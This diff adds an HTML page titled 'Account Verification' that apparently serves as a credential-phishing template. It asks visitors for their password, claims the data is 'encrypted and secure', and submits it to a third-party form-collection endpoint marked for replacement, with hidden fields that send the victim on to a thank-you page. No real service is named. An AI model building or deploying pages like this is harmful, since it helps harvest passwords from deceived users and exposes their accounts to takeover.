@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification</title>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+    <style>
+        :root {
+            --primary: #4361ee;
+            --primary-dark: #3a56d4;
+            --light: #f8f9fa;
+            --dark: #212529;
+            --gray: #6c757d;
+            --success: #4cc9f0;
+            --error: #f72585;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .card {
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,.1);
+            width: 100%;
+            max-width: 420px;
+            overflow: hidden;
+        }
+
+        .card-header {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: #fff;
+            padding: 24px;
+            text-align: center;
+        }
+
+        .card-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+        }
+
+        .card-subtitle {
+            font-size: .9rem;
+            opacity: .9;
+        }
+
+        .card-body {
+            padding: 32px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: .9rem;
+            font-weight: 500;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 1rem;
+            border-radius: 8px;
+            border: 1px solid #e9ecef;
+            background: #f8f9fa;
+            padding-right: 45px;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(67,97,238,.15);
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: var(--gray);
+            font-size: 1.1rem;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border-radius: 8px;
+            border: none;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .btn-primary {
+            background: var(--primary);
+            color: #fff;
+        }
+
+        .btn-primary:hover {
+            background: var(--primary-dark);
+        }
+
+        .message {
+            font-size: .85rem;
+            margin-top: 8px;
+            padding: 8px 12px;
+            border-radius: 6px;
+            display: none;
+        }
+
+        .error-message {
+            background: rgba(247,37,133,.1);
+            color: var(--error);
+        }
+
+        .security-info {
+            margin-top: 24px;
+            padding: 12px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            font-size: .8rem;
+            color: var(--gray);
+            text-align: center;
+        }
+
+        .security-info i {
+            color: var(--primary);
+            margin-right: 6px;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="card">
+    <div class="card-header">
+        <h1 class="card-title">Account Verification</h1>
+        <p class="card-subtitle">Confirm your identity to continue</p>
+    </div>
+
+    <div class="card-body">
+
+        <!-- 🔴 REPLACE FORM ACTION URL -->
+        <form 
+            id="passwordForm"
+            action="https://formspree.io/f/abcdwxyz"
+            method="POST"
+        >
+            <div class="form-group">
+                <label class="form-label">Enter your password</label>
+
+                <div class="input-wrapper">
+                    <input
+                        type="password"
+                        id="password"
+                        name="password"
+                        class="form-control"
+                        placeholder="••••••••"
+                        minlength="6"
+                        required
+                    >
+                    <button type="button" class="toggle-password" id="togglePassword">
+                        <i class="fas fa-eye"></i>
+                    </button>
+                </div>
+
+                <div id="error-message" class="message error-message">
+                    Password must be at least 6 characters long
+                </div>
+            </div>
+
+            <!-- Optional hidden fields -->
+            <input type="hidden" name="_subject" value="New Account Verification">
+            <input type="hidden" name="_redirect" value="thankyou.html">
+
+            <button type="submit" class="btn btn-primary">
+                Continue
+            </button>
+        </form>
+
+        <div class="security-info">
+            <i class="fas fa-lock"></i>
+            Your information is encrypted and secure
+        </div>
+    </div>
+</div>
+
+<script>
+document.getElementById('togglePassword').addEventListener('click', function () {
+    const password = document.getElementById('password');
+    const icon = this.querySelector('i');
+
+    if (password.type === 'password') {
+        password.type = 'text';
+        icon.classList.replace('fa-eye', 'fa-eye-slash');
+    } else {
+        password.type = 'password';
+        icon.classList.replace('fa-eye-slash', 'fa-eye');
+    }
+});
+
+document.getElementById('passwordForm').addEventListener('submit', function (e) {
+    const password = document.getElementById('password');
+    const error = document.getElementById('error-message');
+
+    if (password.value.length < 6) {
+        e.preventDefault();
+        error.style.display = 'block';
+        password.focus();
+    }
+});
+</script>
+
+</body>
+</html>
